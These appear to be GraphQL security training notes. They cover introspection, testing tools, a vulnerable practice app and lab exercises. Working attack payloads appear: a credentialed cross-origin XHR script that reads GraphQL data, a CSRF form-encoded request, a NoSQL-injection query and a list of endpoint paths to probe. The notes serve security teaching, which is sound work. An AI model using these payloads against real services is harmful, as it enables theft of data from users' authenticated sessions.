#### GraphQL
1. What is GraphQL?
2. Graphiql. Query examples.
	
	```
	git clone https://bitbucket.org/igorblum/graphql-mongodb-example.git
	cd graphql-mongodb-example
	docker-compose build
	docker-compose up
	```
	
	[https://medium.com/the-ideal-system/graphql-and-mongodb-a-quick-example-34643e637e49](https://medium.com/the-ideal-system/graphql-and-mongodb-a-quick-example-34643e637e49)
	
3. Introspection [https://graphql.org/learn/introspection/](https://graphql.org/learn/introspection/)
	
	```
	query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        locations\n      }\n    }\n  }\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n

	```

4. Tools.
	- [GraphQL Raider](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
	- GraphGL Voyager
	
		```
		git clone --recursive https://bitbucket.org/igorblum/graphql-voyager-docker.git
		cd graphql-voyager
		docker build -t graphql-voyager .
		docker run --rm -p 9090:80 graphql-voyager
		```
		
	- graphqlschema2payload

		```
		git clone https://bitbucket.org/igorblum/graphqlschema2payload.git
		docker build -t graphqlschema2payload .
		docker run --rm -e http_proxy=http://host.docker.internal:8080 -e NODE_TLS_REJECT_UNAUTHORIZED=0 -p 4000:4000 graphqlschema2payload
		***OR for Linux ***
		docker network inspect bridge|grep Gateway
		docker run --rm -e http_proxy=http://172.17.0.1:8080 -e NODE_TLS_REJECT_UNAUTHORIZED=0 -p 4000:4000 graphqlschema2payload
		```

5. Vulnerabilities.
	- graphql-mongodb-example:
		- CORS. [https://jsfiddle.net/](https://jsfiddle.net/)
		
			```
				<script type="text/javascript">
			  		do_post = function(){
				    var xhr = new XMLHttpRequest();
				    var url = "http://192.168.1.130:3001/graphql?";
				    xhr.open("POST", url);
				    xhr.withCredentials = true;
				    xhr.setRequestHeader("Content-Type", "application/json");
				    var jsn = {"variables": { },
				        "query": "query {\n  posts {\n    _id\n    title\n    content\n  }\n}"};
				
				    xhr.send(JSON.stringify(jsn));
				
				    xhr.onreadystatechange = function() {
				      if (this.readyState === this.DONE) {
				          alert(this.responseText);
				          document.write(this.responseText);
				      }
				    };
				
				  }
				
				  do_post();
				</script>
			```
			
		- CSRF
		
			``` 
			Content-Type: application/x-www-form-urlencoded
			...
			
			query=query+{+posts{+_id%0atitle%0a+content+}}&variables=
			```
			
	- Vulnerable application:
	
		```
		git clone https://bitbucket.org/igorblum/poc-graphql.git
		cd poc-graphql
		docker build -t graphql-poc-app .
		docker run --rm -p 8888:8888 graphql-poc-app
		```
	- graphql-mongodb-example: NoSQL.
		```
		query Query($pass: JSON!){
		  secrets(password: $pass){
		    title
		    password
		  }
		}
		```
		
		Variables:
		
		```
		{
		  "pass": "1e61f2f066980ba2b6aa13f47fd6360a"
		}
		```
	- graphcool
		- init & deploy
		
			```
			graphcool init test
			graphcool deploy
			```
		- Deployed versions:
		
			access-control:
			
			- Simple API: [https://api.graph.cool/simple/v1/ck1bsqacv40zj01477jbktt1h](https://api.graph.cool/simple/v1/ck1bsqacv40zj01477jbktt1h)
			- Relay API: [https://api.graph.cool/relay/v1/ck1bsqacv40zj01477jbktt1h](https://api.graph.cool/relay/v1/ck1bsqacv40zj01477jbktt1h)
			- Subscriptions API: [wss://subscriptions.graph.cool/v1/ck1bsqacv40zj01477jbktt1h](wss://subscriptions.graph.cool/v1/ck1bsqacv40zj01477jbktt1h)
			
			no-restrictions:
			
			- Simple API: [https://api.graph.cool/simple/v1/ck1bwr13955z601234cx7pl3p](https://api.graph.cool/simple/v1/ck1bwr13955z601234cx7pl3p)
			- Relay API: [https://api.graph.cool/relay/v1/ck1bwr13955z601234cx7pl3p](https://api.graph.cool/relay/v1/ck1bwr13955z601234cx7pl3p)
			- Subscriptions API: [wss://subscriptions.graph.cool/v1/ck1bwr13955z601234cx7pl3p](wss://subscriptions.graph.cool/v1/ck1bwr13955z601234cx7pl3p)
			
		- Queries:
		
		```
		mutation createUser($name: String, $password: String, $dob: DateTime){
		  createUser(name:$name, password:$password, dateOfBirth:$dob){
		    name
		    dateOfBirth
		  }
		}
		
		Variables:
		{
		  "name":"owasp",
		  "password": "$2y$12$a0ZyWgVfEC3GMBoAuj3Fb.UAUn3f2bSOu8mbcEDJsiIfE/sSjZ6bO",
		  "dob": "1985-01-01"
		}
		
		
		
		query allUsers($filter: UserFilter){
		  allUsers(filter:$filter){
		    name,
		    dateOfBirth,
		    password
		  }
		}
		
		Variables:
		{
		  "filter": {
		    "name": "owasp"
		  }
	    }
		```
		
	- [http://ctf.hacker101.com/](http://ctf.hacker101.com/) - BugDB v1 & BugDB v2

6. List

	```
	/graphql
	/graphqlBatch
	/graphql.php
	/graphiql
	/graphql/console/
	/graphql.php?debug= 1
	```
